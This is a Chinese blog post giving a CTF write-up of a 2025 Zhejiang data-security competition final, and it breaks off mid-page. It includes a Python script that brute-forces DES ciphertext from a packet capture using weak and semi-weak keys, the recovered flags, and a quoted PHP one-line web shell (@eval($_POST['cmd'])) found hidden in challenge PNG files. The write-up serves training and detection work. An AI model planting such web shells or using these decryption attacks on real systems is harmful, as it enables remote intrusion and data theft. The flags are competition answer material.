---
title: 2025浙江省信息通信业职业技能竞赛-数据安全管理员竞赛-决赛wp - 渗透测试中心
url: https://www.cnblogs.com/backlion/p/19089843
source: 博客园 - 渗透测试中心
date: 2025-09-14
fetch_date: 2025-10-02T20:09:06.852829
---

# 2025浙江省信息通信业职业技能竞赛-数据安全管理员竞赛-决赛wp - 渗透测试中心

[![](https://img2024.cnblogs.com/blog/35695/202509/35695-20250929100304557-587378723.jpg)](https://qoder.com/)

* [![博客园logo](//assets.cnblogs.com/logo.svg)](https://www.cnblogs.com/ "开发者的网上家园")
* [会员](https://cnblogs.vip/)
* [众包](https://www.cnblogs.com/cmt/p/18500368)
* [新闻](https://news.cnblogs.com/)
* [博问](https://q.cnblogs.com/)
* [闪存](https://ing.cnblogs.com/)
* [赞助商](https://www.cnblogs.com/cmt/p/19081960)
* [HarmonyOS](https://harmonyos.cnblogs.com/)
* [Chat2DB](https://chat2db-ai.com/)

* ![搜索](//assets.cnblogs.com/icons/search.svg)
  ![搜索](//assets.cnblogs.com/icons/enter.svg)
  + ![搜索](//assets.cnblogs.com/icons/search.svg)

    所有博客
  + ![搜索](//assets.cnblogs.com/icons/search.svg)

    当前博客
* [![写随笔](//assets.cnblogs.com/icons/newpost.svg)](https://i.cnblogs.com/EditPosts.aspx?opt=1 "写随笔")
  [![我的博客](//assets.cnblogs.com/icons/myblog.svg)](https://passport.cnblogs.com/GetBlogApplyStatus.aspx "我的博客")
  [![短消息](//assets.cnblogs.com/icons/message.svg)](https://msg.cnblogs.com/ "短消息")
  ![简洁模式](//assets.cnblogs.com/icons/lite-mode-on.svg)

  [![用户头像](//assets.cnblogs.com/icons/avatar-default.svg)](https://home.cnblogs.com/)

  [我的博客](https://passport.cnblogs.com/GetBlogApplyStatus.aspx)
  [我的园子](https://home.cnblogs.com/)
  [账号设置](https://account.cnblogs.com/settings/account)
  [会员中心](https://vip.cnblogs.com/my)
  简洁模式 ...
  退出登录

  [注册](https://account.cnblogs.com/signup)
  登录

[![返回主页](/skins/custom/images/logo.gif)](https://www.cnblogs.com/backlion/)

# [渗透测试中心](https://www.cnblogs.com/backlion)

##

* [博客园](https://www.cnblogs.com/)
* [首页](https://www.cnblogs.com/backlion/)
* [新随笔](https://i.cnblogs.com/EditPosts.aspx?opt=1)
* [联系](https://msg.cnblogs.com/send/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BF%83)
* [管理](https://i.cnblogs.com/)
* 订阅
  [![订阅](/skins/coffee/images/xml.gif)](https://www.cnblogs.com/backlion/rss/)

# [2025浙江省信息通信业职业技能竞赛-数据安全管理员竞赛-决赛wp](https://www.cnblogs.com/backlion/p/19089843 "发布于 2025-09-13 23:13")

### 通信证-签到

![图片](https://img2024.cnblogs.com/blog/1049983/202509/1049983-20250913231312028-1322052955.png)

```
flag{data_security_is_very_interesting}
```

### 数据加密与解密-KeekKey

题目描述：在数据安全领域，弱密钥和不安全的加密方式如同数字世界的 "隐形杀手"，可能引发严重安全漏洞，威胁个人、企业甚至国家网络安全。如金融交易系统使用弱密钥，会被黑客暴力破解篡改数据；电商平台若加密模式缺乏随机化，易导致用户密码泄露。本次挑战赛中，你将作为网络安全分析师，剖析存在风险的加密通信协议，检查密钥机制与加密模式，寻找安全漏洞和隐藏 Flag

UPD流量根据题目描述可以知道弱密钥

如果有经验可以想到DES弱密钥攻击

![图片](https://img2024.cnblogs.com/blog/1049983/202509/1049983-20250913231312931-2001115574.png)

原理：

1. **提取加密消息**：从pcapng网络抓包文件中提取潜在的加密消息
2. **DES弱密钥攻击**：使用已知的DES弱密钥和半弱密钥尝试解密消息
3. **模式匹配**：寻找解密后可能包含flag的明文

因为复现嘛上网搜索相关资料找到一篇文章

```
https://noob-atbash.github.io/CTF-writeups/cyberwar/crypto/chal-5.html
```

这篇有弱密钥 参考这个 常见的弱密钥 进行爆破 写个脚本

```
import subprocess
```

```
import re
```

```
import json
```

```
from Crypto.Cipher import DES
```

```
from base64 import b64decode
```

```

```

```
def extract_msgs(pcap):
```

```
    cmd = ['tshark', '-r', pcap, '-T', 'fields', '-e', 'data']
```

```
    res = subprocess.run(cmd, capture_output=True, text=True).stdout.splitlines()
```

```
    msgs = []
```

```
    for line in res:
```

```
        try:
```

```
            s = bytes.fromhex(line).decode(errors='ignore')
```

```
            for m in re.findall(r'\{.*?\}', s, re.DOTALL):
```

```
                try:
```

```
                    obj = json.loads(m)
```

```
                    if 'msg' in obj: msgs.append(obj['msg'])
```

```
                except:
```

```
                    pass
```

```
        except:
```

```
            pass
```

```
    with open('output.txt', 'w') as f:
```

```
        f.write('\n'.join(msgs))
```

```
    return msgs
```

```

```

```

```

```
WEAK_KEYS = [
```

```
    b'\x01\x01\x01\x01\x01\x01\x01\x01',
```

```
    b'\x1F\x1F\x1F\x1F\x0E\x0E\x0E\x0E',
```

```
    b'\xE0\xE0\xE0\xE0\xF1\xF1\xF1\xF1',
```

```
    b'\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF'
```

```
]
```

```

```

```
SEMI_WEAK_KEYS = [
```

```
    b'\x01\xFE\x01\xFE\x01\xFE\x01\xFE',
```

```
    b'\xFE\x01\xFE\x01\xFE\x01\xFE\x01',
```

```
    b'\x1F\xE0\x1F\xE0\x0E\xF1\x0E\xF1',
```

```
    b'\xE0\x1F\xE0\x1F\xF1\x0E\xF1\x0E',
```

```
    b'\x01\xE0\x01\xE0\x01\xF1\x01\xF1',
```

```
    b'\xE0\x01\xE0\x01\xF1\x01\xF1\x01',
```

```
    b'\x1F\xFE\x1F\xFE\x0E\xFE\x0E\xFE',
```

```
    b'\xFE\x1F\xFE\x1F\xFE\x0E\xFE\x0E',
```

```
    b'\x01\x1F\x01\x1F\x01\x0E\x01\x0E',
```

```
    b'\x1F\x01\x1F\x01\x0E\x01\x0E\x01',
```

```
    b'\xE0\xFE\xE0\xFE\xF1\xFE\xF1\xFE',
```

```
    b'\xFE\xE0\xFE\xE0\xFE\xF1\xFE\xF1'
```

```
]
```

```

```

```
KEYS = WEAK_KEYS + SEMI_WEAK_KEYS
```

```
PATTERN = re.compile(b'flag\{.*?\}', re.IGNORECASE)
```

```

```

```

```

```
def attack():
```

```
    msgs = extract_msgs("capture.pcapng")
```

```
    print(f"提取 {len(msgs)} 条消息，开始攻击...")
```

```
    for i, msg in enumerate(msgs):
```

```
        try:
```

```
            ct = b64decode(msg)
```

```
            for key in KEYS:
```

```
                pt = DES.new(key, DES.MODE_ECB).decrypt(ct)
```

```
                if PATTERN.search(pt):
```

```
                    print(f"\n找到匹配 (消息 {i + 1}):")
```

```
                    print(f"密钥: {key.hex()}")
```

```
                    print(f"明文: {pt.decode(errors='replace')}")
```

```
        except:
```

```
            pass
```

```

```

```

```

```
if __name__ == "__main__":
```

```
    attack()
```

```
FLAG HEADER:flag{9adee8d8d9db40fc99e8366bf2bd474d}
```

![图片](https://img2024.cnblogs.com/blog/1049983/202509/1049983-20250913231313886-488561054.png)

方法2手动提取也可以：

![图片](https://img2024.cnblogs.com/blog/1049983/202509/1049983-20250913231314879-866184135.png)

![图片](https://img2024.cnblogs.com/blog/1049983/202509/1049983-20250913231315885-1248850158.png)

保存1.txt 写个脚本，对每条消息进行base64解码

使用所有弱密钥和半弱密钥尝试解密

```
import re, json
```

```
msgs = []
```

```
with open("1.txt") as f:
```

```
    for line in f:
```

```
        text = bytes.fromhex(line.strip()).decode("utf-8", "ignore")
```

```
        for item in re.findall(r"\{.*?\}", text):
```

```
            if item.startswith("{") and item.endswith("}") and "\"" in item:  # 粗筛掉非法 JSON
```

```
                obj = json.loads(item)
```

```
                if "msg" in obj:
```

```
                    msgs.append(obj["msg"])
```

```

```

```
with open("output.txt", "w") as f:
```

```
    f.write("\n".join(msgs))
```

```

```

```
print(f"完成，提取 {len(msgs)} 条消息，已保存到 output.txt")
```

![图片](https://img2024.cnblogs.com/blog/1049983/202509/1049983-20250913231316765-282130619.png)

![6cc86cfc93e923a0eb9838ce96b2e528.png](https://img2024.cnblogs.com/blog/1049983/202509/1049983-20250913231317544-1496903793.png)

```
flag{9adee8d8d9db40fc99e8366bf2bd474d}
```

### 数据处理-MISC-大浪淘金方显英雄本色

描述:1.每类文件有五个包含敏感信息泄露或者恶意代码

2.找出来排序 优先级txt>png>pdf  大写>小写>数字 0-9  a-z

3.排列格式xx.xx,yy.yy,zz.zz，结果md5加密 加上flag。

首先拿到题目一堆文件 大概分析一下

![图片](https://img2024.cnblogs.com/blog/1049983/202509/1049983-20250913231318194-1772522942.png)

![图片](https://img2024.cnblogs.com/blog/1049983/202509/1049983-20250913231318825-2041478869.png)

![图片](https://img2024.cnblogs.com/blog/1049983/202509/1049983-20250913231319473-1155587230.png)

先找txt因为比较好找

![图片](https://img2024.cnblogs.com/blog/1049983/202509/1049983-20250913231320318-1825225744.png)

![图片](https://img2024.cnblogs.com/blog/1049983/202509/1049983-20250913231320982-221503961.png)

![image.png](https://img2024.cnblogs.com/blog/1049983/202509/1049983-20250913231321637-42234444.png)

![图片](https://img2024.cnblogs.com/blog/1049983/202509/1049983-20250913231322266-1516999989.png)

![图片](https://img2024.cnblogs.com/blog/1049983/202509/1049983-20250913231322949-1200072883.png)

png的话主要是第一个不好找,找到第一个就好找了

![图片](https://img2024.cnblogs.com/blog/1049983/202509/1049983-20250913231323619-1478638751.png)

发现png是一句话木马直接用技巧

```
<?php @eval($_POST['cmd']); ?>
```

直接使用kali grep过滤  还可以使用D盾查杀

![图片](https://img2024.cnblogs.com/blog/1049983/202509/1049983-20250913231324474-1550820665.png)

![图片](https://i...